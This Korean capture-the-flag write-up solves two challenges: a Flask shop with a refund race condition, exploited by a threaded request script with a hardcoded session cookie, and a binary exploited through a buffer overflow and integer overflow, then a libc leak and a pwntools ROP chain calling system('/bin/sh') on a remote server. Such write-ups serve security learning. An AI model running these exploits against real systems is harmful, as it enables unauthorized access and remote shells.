# oh_My_Cheeese(한별님)
## 문제 코드
```python
import sqlite3
import os
import uuid
import hashlib
from flask import Flask, flash,request, session,render_template, make_response, redirect, url_for
import time

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = 'database.db'

FLAG = "FLAG{test_flag}"

def init_db():
    db = sqlite3.connect(DATABASE)
    cursor = db.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user (
            id INTEGER PRIMARY KEY,
            user_ID TEXT NOT NULL,
            user_PW TEXT NOT NULL,
            money INTEGER NOT NULL DEFAULT 500,
            user_cheeese INTEGER DEFAULT 0,
            user_flag INTEGER DEFAULT 0,
            unique(user_ID)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            price INTEGER NOT NULL,
            content TEXT NOT NULL,
            unique(name)
        )
    ''')

    cursor.execute("INSERT OR IGNORE INTO items (name, price, content) VALUES (?, ?, ?)", ('cheeeese', 500, 'hehe'))
    cursor.execute("INSERT OR IGNORE INTO items (name, price, content) VALUES (?, ?, ?)", ('FLAG', 5000, FLAG))
    db.commit()

def execute_query(query, values=None):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    if values is None:
        cursor.execute(query)
    else:
        cursor.execute(query, values)
    conn.commit()
    return cursor


def get_user(user_id):
    user = execute_query('SELECT * FROM user WHERE user_ID = ?', (user_id,)).fetchone()
    if user:
        return user
    return None


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/market')
def market():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    return render_template('market.html')

@app.route('/refund')
def refund():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    return render_template('refund.html')

@app.route('/mypage')
def mypage():
    
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    flag = user[5]
    if user[5] > 0:
        flag = execute_query("SELECT * FROM items where name='FLAG'").fetchone()[3]
    return render_template("mypage.html",money=user[3],cheese=user[4],flag=flag)
    



@app.route("/item/refund/cheeese",methods=['GET'])
def cheese_refund():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    cheese_num = user[4]
    
    
    if cheese_num <= 0:
        return "<script>alert('you Don have cheese!');location.href='/'</script>"


    cheese_num -= 1
    
    execute_query('UPDATE user SET money=money+500, user_cheeese=? where user_ID=?',(cheese_num,session['id']))
    return "<script>alert('Thank you!');location.href='/'</script>"
    

@app.route('/item/purchase/flag', methods=['GET'])
def flag_purchase():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    flag_num = user[5]
   
    
    if user_money < 5000:
        return "<script>alert('Not enough money!');location.href='/'</script>"
    
    
    user_money -= 5000
    flag_num += 1
    
    execute_query('UPDATE user SET money=?, user_flag=? where user_ID=?',(user_money,flag_num,session['id']))
    
    return "<script>alert('Thank you!');location.href='/'</script>"
        
@app.route('/item/purchase/cheeese', methods=['GET'])
def cheese_purchase():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    cheese_num = user[4]
    

    if user_money < 100:
        return "<script>alert('Not enough money!');location.href='/'</script>"
    
    cheese_num += 1
    
    execute_query('UPDATE user SET money=money-500, user_cheeese=? where user_ID=?',(cheese_num,session['id']))
    
    return "<script>alert('Thank you!');location.href='/'</script>"

@app.route('/login', methods=['POST','GET'])
def login():
    if request.method=='GET':
        return render_template('login.html')
    
    user_id = request.form['id']
    user_pw = request.form['pw']
    user_pw = hashlib.sha256(user_pw.encode()).hexdigest()
    
    user = execute_query("SELECT * FROM user where user_ID=? AND user_PW=?", (user_id, user_pw)).fetchone()

    
    if user == None:
        return "<script>alert('fail!');location.href='/login'</script>"
        
    session['id'] = user[1]
    print(user)
    return redirect('/')

    
@app.route('/register', methods=['POST',"GET"])
def register():
    if request.method=='GET':
        return render_template('regist.html')

    user_id = request.form['id']
    user_pw = request.form['pw']
    
    if get_user(user_id) != None:
        return render_template('index.html')
    
    user_pw = hashlib.sha256(user_pw.encode()).hexdigest()
    execute_query('INSERT INTO user (user_ID, user_PW) VALUES (?, ?)', (user_id, user_pw))

    return "<script>alert('Success!');location.href='/login'</script>"
    
        

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=10011, threaded=True)
```


## 분석
Refund 기능을 이용하면 가지고 있는 상품을 다시 되팔 수 있음
하지만 Race condition이 발생할 수 있음
Race condition은 두 개 이상의 프로세스나 스레드가 데이터에 동시에 액세스하고 이를 수정하려 할 때 발생
두 명 이상의 사용자가 거의 동시에 `cheese_refund` 함수를 호출하고, 같은 사용자 세션을 사용하고 있을 때 문제가 발생할 수 있음
## Exploit
멀티쓰레딩을 통해 동시에 여러 번 Refund 요청을 날리면 중복으로 적용되어 여러 번 돈이 들어옴
따라서 이를 반복한 뒤 (구매 - 멀티쓰레딩 - 구매 - 멀티쓰레딩) 플래그를 구매하면 됨
아래의 코드가 race condition을 유발하려면 서버의 `/item/refund/cheeese` 엔드포인트가 아래 조건을 충족해야 함
1. 서버는 멀티스레딩 또는 멀티프로세싱 환경에서 실행(즉, 동시 요청을 처리할 수 있음).
2. 서버 측 응용 프로그램은 동시 데이터베이스 쓰기 작업을 동기화하지 않음
3. 데이터베이스 자체에 적절한 트랜잭션 관리나 락킹 메커니즘이 없거나, 코드가 그러한 메커니즘을 사용하지 않음

```python
import threading 
import requests 
def refund(): 
	url = f"http://54.180.98.27:1011/item/refund/cheeese" 
	headers = { "Cookie": "session=eyJpZCI6ImFhYWEifQ.ZUXHtg.rtzL_qMLMrAuQdKr-8vFoTedUYg" } 
	res = requests.get(url=url, headers=headers) 
	print(res.text) 
	
for i in range(10): 
t = threading.Thread(target=refund) 
t.start()
```

![[Pasted image 20231106135549.png]]

# bankwallet(judoking)
## 문제 코드
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  int v5; // [rsp+38h] [rbp-8h] BYREF
  int v6; // [rsp+3Ch] [rbp-4h]

  init();
  v6 = 0;
  puts("Welcome to Wallet!!");
  while ( count > 0 )
  {
    if ( v6 )
    {
      show_menu();
      __isoc99_scanf("%d", &v5);
      call_func(v5);
      if ( money < 0 )
      {
        puts("Oh, You Don't Have Money");
        printf("Don't run!! What's Youre name?");
        read(0, buf, 0x100uLL);
        printf("%s", buf);
        printf("Tell Me One More. What?");
        read(0, buf, 0x100uLL);
        puts("See You.. I will wait you.");
        money = 0;
      }
    }
    else
    {
      if ( (unsigned int)verify_password() != 1 )
        exit(0);
      v6 = 1;
    }
  }
  puts("Finish Your Trade");
  return 0;
}
```

```c
__int64 __fastcall call_func(int a1)
{
  if ( a1 == 4 )
    return lend();
  if ( a1 > 4 )
    goto LABEL_11;
  if ( a1 == 3 )
    return show_money();
  if ( a1 == 1 )
    return buy();
  if ( a1 != 2 )
  {
LABEL_11:
    printf("Error Code");
    exit(1);
  }
  return work();
}
```

```c
__int64 lend()
{
  __int64 result; // rax
  int v1; // [rsp+8h] [rbp-8h] BYREF

  puts("======== lend money ========");
  printf("Input Percentage: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 100 )
    printf("You Can't");
  else
    money *= v1;
  puts("lend finish");
  printf("your money : %d\n", (unsigned int)money);
  result = (unsigned int)(count - v1 / 10);
  count -= v1 / 10;
  return result;
}
```

```c
__int64 buy()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  puts("======== buy ========");
  show_item();
  printf("Choost Your Item :");
  __isoc99_scanf("%d", &v1);
  if ( 1000000 * v1 <= money )
  {
    puts("Good. Have a Good Day!");
    money += -1000000 * v1;
  }
  else
  {
    puts("Not enough Money!");
  }
  return (unsigned int)--count;
}
```


## 분석
처음에 인증과정이 있지만 난수로 설정된 비밀번호를 뚫어야 함
버퍼오버플로우를 이용해 인증을 우회할 수 있음
돈을 빌리는 lend와 돈으로 물건을 구매할 수 있는 buy 기능이 있고, 돈을 음수로 만들면 사용자의 이름을 2번 입력 받고 종료함
lend와 buy에서 돈을 음수로 입력 받을 수 있는 점을 이용해 돈을 계속 늘릴 수 있고,
Integer Overflow를 이용해 돈을 음수로 바꿀 수 있음
사용자의 이름을 입력받았을 때, 사용자의 이름을 입력 받고 이름을 다시 출력하는데, 이 때, `libc_start_main`를 알아낼 수 있고,
이를 이용해서 2번째 입력 때 다양한 가젯들을 이용하여, exploit할 수 있음

아래는 보호기법과 컴파일 정보들임 
```sh
┌──(foo1㉿main-server)-[~/Desktop/HspaceFinal/bankwallet]
└─$ checksec bankwallet 
[*] '/home/foo1/Desktop/HspaceFinal/bankwallet/bankwallet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/HspaceFinal/bankwallet]
└─$ file bankwallet 
bankwallet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7260333881aba02dd280878309c63b5e6bf9842a, for GNU/Linux 3.2.0, not stripped
```

## Exploit
```python
from pwn import * 

p = remote("54.180.98.27",1004)

e = ELF("./libc-2.31.so")

context.log_level = 'debug'

# 인증과정 우회
payload=b''
payload+=b'f'*104

p.recvuntil("System.")
p.sendline(payload)

payload=b''
payload+=b'6'*8

p.sendline(payload)

# 돈 음수 만들기
for i in range(100):
   p.sendline(b'4')
   p.sendline(b'-100')

   for i in range(10):
      p.sendline(b'2')

   p.sendline(b'3')

for i in range(8):
   p.sendline(b'4')

# libc_start_main 획득
p.send(b'a'*0x38)

p.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
a  = (p.recv(6) + b'\x00\x00')
print("AaAAAAAAAAAA : ",a)
a = u64(a)
print(a)

# ROP
libc_base = a - e.symbols['__libc_start_main'] - 243
system = libc_base + e.symbols['system']
binsh = libc_base + list(e.search(b"/bin/sh"))[0]
print("AaAAAAAAAAAA : ",a)
r = 0x000000000040101a
pr = 0x0000000000401953
payload = b'a' * 0x38
payload += p64(r)
payload += p64(pr)
payload += p64(binsh)
payload += p64(system)
p.send(payload)

p.interactive()
```


# 